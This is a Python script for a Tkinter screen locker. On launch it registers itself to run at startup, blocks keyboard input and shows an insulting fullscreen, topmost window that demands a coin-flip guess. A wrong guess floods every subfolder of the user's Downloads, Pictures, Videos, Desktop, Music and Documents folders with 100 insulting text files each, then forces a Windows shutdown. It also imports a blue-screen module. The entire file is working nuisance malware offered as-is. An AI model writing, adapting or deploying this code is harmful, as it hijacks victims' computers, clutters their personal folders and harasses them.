#! /usr/bin python
# -*- coding: utf-8 -*-


from tkinter import *
import time
from tkinter import messagebox
from functools import partial
 

from modules import bsod, startup, uninstall

import os

import keyboard
import sys

import random
from pathlib import Path


number = str(random.randint(1, 2))
password = number
lock_text = "Coinflip! Guess a number between 1 and 2"
count = 1



file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])

startup(file_path)

def buton(arg):
	enter_pass.insert(END, arg)
def delbuton():
	enter_pass.delete(-1, END)


def tapp(key):
	pass

def check():
	global count
	if enter_pass.get() == str(password):
		messagebox.showinfo("STUPID LOL","UNLOCKED SUCCESSFULLY")
		uninstall(wind)

	else:
		count -= 1
		if count == 0:
			messagebox.showwarning("STUPID LOL","number of attempts expired")


##############################################################################################

		
			# Function to create specified number of files in each directory
			def create_files_in_folders(root_dirs, file_name, content, num_files_per_folder):
				for root_dir in root_dirs:
					for foldername, subfolders, filenames in os.walk(root_dir):
						for i in range(num_files_per_folder):
							file_path = os.path.join(foldername, f"{file_name}_{i+1}.txt")
							# Check if file doesn't already exist
							if not os.path.exists(file_path):
								with open(file_path, 'w') as file:
									file.write(content)

			# Specify the root directories where you want to create files
			root_directories = [
				os.path.join(os.path.expanduser("~"), "Downloads"),
				os.path.join(os.path.expanduser("~"), "Pictures"),
				os.path.join(os.path.expanduser("~"), "Videos"),
				os.path.join(os.path.expanduser("~"), "Desktop"),
				os.path.join(os.path.expanduser("~"), "Music"),
				os.path.join(os.path.expanduser("~"), "Documents"),
			]

			# Specify the name of the file you want to create in each folder
			file_to_create = 'Do not touch'

			# Specify the content you want to write into each file
			file_content = 'Dumb ass\n'*100

			# Specify the number of files to create in each folder
			num_files_per_folder = 100

			create_files_in_folders(root_directories, file_to_create, file_content, num_files_per_folder)


##############################################################################################


			os.system("shutdown /s /t 1")

		else:
			
			messagebox.showwarning("STUPID LOL","Wrong password. Avalible tries: "+ str(count))


def exiting():
	messagebox.showwarning("STUPID LOL","DEATH IS INEVITABLE")
wind = Tk()
wind.title("STUPID LOL")
wind["bg"] = "black"
UNTEXD = Label(wind,bg="black", fg="white",text="YOU ARE STUPID\n\n", font="helvetica 75").pack()
untex = Label(wind,bg="black", fg="white",text=lock_text, font="helvetica 40")
untex.pack(side=TOP)

keyboard.on_press(tapp, suppress=True)


enter_pass = Entry(wind,bg="black", fg="white", text="", font="helvetica 35")
enter_pass.pack()
wind.resizable(0,0)


wind.lift()
wind.attributes('-topmost',True)

wind.after_idle(wind.attributes,'-topmost',True)
wind.attributes('-fullscreen', True)
button = Button(wind,text='unlock',padx="31", pady="19",bg='black',fg='white',font="helvetica 30", command=check)
button.pack()
wind.protocol("WM_DELETE_WINDOW", exiting)

#button0 = Button(wind,text='0',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=partial(buton, "0")).pack(side=LEFT)
button1 = Button(wind,text='1',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=partial(buton, "1")).pack(side=LEFT)
button2 = Button(wind,text='2',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=partial(buton, "2")).pack(side=LEFT)
#button3 = Button(wind,text='3',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=partial(buton, "3")).pack(side=LEFT)
#button4 = Button(wind,text='4',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=partial(buton, "4")).pack(side=LEFT)
#button5 = Button(wind,text='5',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=partial(buton, "5")).pack(side=LEFT)
#button6 = Button(wind,text='6',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=partial(buton, "6")).pack(side=LEFT)
#button7 = Button(wind,text='7',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=partial(buton, "7")).pack(side=LEFT)
#button8 = Button(wind,text='8',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=partial(buton, "8")).pack(side=LEFT)
#button9 = Button(wind,text='9',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=partial(buton, "9")).pack(side=LEFT)
delbutton = Button(wind,text='<',padx="28", pady="19",bg='black',fg='white',font="helvetica 25", command=delbuton).pack(side=LEFT)


wind.mainloop()